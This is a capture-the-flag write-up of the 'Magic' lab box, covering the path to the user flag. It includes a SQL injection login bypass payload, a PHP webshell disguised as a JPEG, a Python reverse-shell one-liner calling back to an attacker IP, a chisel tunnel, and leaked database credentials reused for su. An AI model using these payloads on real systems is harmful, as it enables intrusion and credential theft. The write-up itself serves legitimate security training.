## Overview

Magic is a medium-difficulty Linux box built around a custom PHP image-gallery app. The login form is injectable, so `' or 1=1-- -` bypasses authentication and exposes an upload page. The upload validation — extension whitelist plus magic-byte check — is defeated with a `webshell.php.jpg` file that carries real JPEG header bytes, because a misconfigured Apache handler still runs anything containing `.php` as PHP. From the resulting `www-data` shell, a config file leaks database credentials, and the database stores an admin password in cleartext that is reused for the `theseus` system account. This post covers recon through the user flag.

Web-driven box leaning on enumeration and a SQLi auth bypass plus a magic-byte/unanchored-FilesMatch webshell trick into cred reuse; no CVE and only light custom payload crafting.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | OpenSSH 7.6p1 | Ubuntu, default |
| 80/tcp | Apache httpd 2.4.29 | "Magic Portfolio", custom PHP |

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.185 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.10.185
```

Two open ports. SSH is unlikely without credentials, so the web app is the way in. Port 80 serves an image gallery whose footer says *"Please Login, to upload images."*

## Enumeration

The login page rejects common credentials like `admin/admin`. Directory brute-forcing fills in the structure:

```bash
gobuster dir -u http://10.10.10.185 -w /usr/share/dirb/wordlists/common.txt -x php
```

This reveals `login.php`, `upload.php` (which redirects back to login), and an `images` directory. Enumerating `images` further uncovers an `uploads` folder — worth remembering once we can write files.

```bash
gobuster dir -u http://10.10.10.185/images -w /usr/share/dirb/wordlists/common.txt -x php
```

## Foothold

**1 — SQL injection login bypass.** The `username` and `password` fields are concatenated directly into the authentication query. A classic always-true payload comments out the rest of the query and logs us in:

```
Username: ' or 1=1-- -
Password: anything
```

We land on `upload.php`, which lets us upload images.

**2 — Whitelist + magic-byte bypass for RCE.** A plain PHP shell is rejected with *"only JPG, JPEG & PNG files are allowed."* The app checks both the extension and the file's magic bytes (`exif_imagetype`). The trick is Apache: when the `FilesMatch` regex that maps PHP isn't anchored with `$`, any filename merely *containing* `.php` is executed by the PHP handler. So a file named `webshell.php.jpg` passes the extension check, and prepending real JPEG header bytes passes the content check — yet it still runs as PHP.

```bash
echo 'FFD8FFDB' | xxd -r -p > webshell.php.jpg
echo '<?=`$_GET[0]`?>' >> webshell.php.jpg
```

Upload it, then trigger commands through the `uploads` directory found earlier:

```bash
curl -s "http://10.10.10.185/images/uploads/webshell.php.jpg?0=whoami"
# -> www-data
```

`bash -i` reverse shells don't fire here, but `python3` is present, so a Python one-liner gives an interactive shell:

```bash
nc -lvnp 4444
curl -s "http://10.10.10.185/images/uploads/webshell.php.jpg" --data-urlencode '0=python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.7\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")"'
```

**3 — Plaintext DB credentials.** The web root holds `db.php5` with hardcoded MySQL credentials:

```bash
cat /var/www/Magic/db.php5
# $dbUsername = 'theseus'; $dbUserPassword = 'iamkingtheseus'; $dbName = 'Magic';
```

`su theseus` with `iamkingtheseus` fails, MySQL only listens on localhost, and the `mysql` client isn't installed on the box — so forward port 3306 back to Kali with chisel:

```bash
# Kali:
chisel server -p 8000 --reverse
# Target (after fetching chisel):
/tmp/chisel client 10.10.14.7:8000 R:3306:127.0.0.1:3306 &
```

Then query the database from Kali through the tunnel:

```bash
mysql -h 127.0.0.1 -P 3306 -u theseus -piamkingtheseus -e "use Magic; select * from login;"
# id | username | password
#  1 | admin    | Th3s3usW4sK1ng
```

**4 — Password reuse for the user flag.** The admin password stored in plaintext is reused as the Linux password for `theseus`:

```bash
su theseus     # Th3s3usW4sK1ng
```

## User flag

```bash
cat /home/theseus/user.txt
# [redacted]
```

We have an interactive shell as `theseus` and the user flag.

Privilege escalation (the SUID `/bin/sysinfo` PATH hijack) is left as an exercise — this post stops at user.
